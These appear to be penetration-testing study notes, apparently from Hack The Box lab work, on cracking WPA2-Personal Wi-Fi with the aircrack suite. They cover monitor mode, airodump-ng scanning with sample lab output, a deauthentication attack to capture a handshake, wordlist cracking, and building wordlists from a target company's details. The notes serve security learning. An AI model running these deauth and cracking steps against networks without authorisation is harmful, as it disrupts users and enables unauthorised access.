# Hacking Wifi

## WPA2 Personal
### Notes
Custom wordlist - Company name, all phone numbers, company info
Run all possible combinations of phone numbers

# Traditional Attack
## Aircrack
### Recon
Put the correct wifi adapter in monitor mode:
```bash
# Monitor mode
airmon-ng start <wlan adapter>
```
You may need to kill some services that are using the adapter, as airmon-ng needs exclusive access to the adapter:
```bash
airmon-ng check kill
```
Use `airodump-ng` to scan for targets
* This will list all access points and their clients.
```bash
# Basic
airodump-ng <wlan adapter mon>
```
* We can use `-c 1` to set the channel, and `-w` to save the results to a file, and `--bssid` to narrow down the access point.
```bash
airodump-ng -c <channel> --bssid <mac> -w <cap file> <ifacemon>
```
```bash
# Real world example
Chvxt3r@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WPA

21:58:02  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:2D:BF:FE:13:83  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox                                                    

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 80:2D:BF:FE:13:83  8A:00:A9:9B:ED:1A  -29    1 - 5      0      656  EAPOL  HackTheBox
```
>Note: `BSSID` is the mac of the AP, and `station` is the mac of a client

## Handshake Capture

# Deauth Attack
New Terminal
aireplay-ng -0 1 -a <mac of AP> -c <mac of client> <ifacemon>

#Look for WPA Handshake before closing airodump

# Crack the key
aircrack-ng -w <wordlist> -b <AP Mac Address> <capturefile .cap>
```
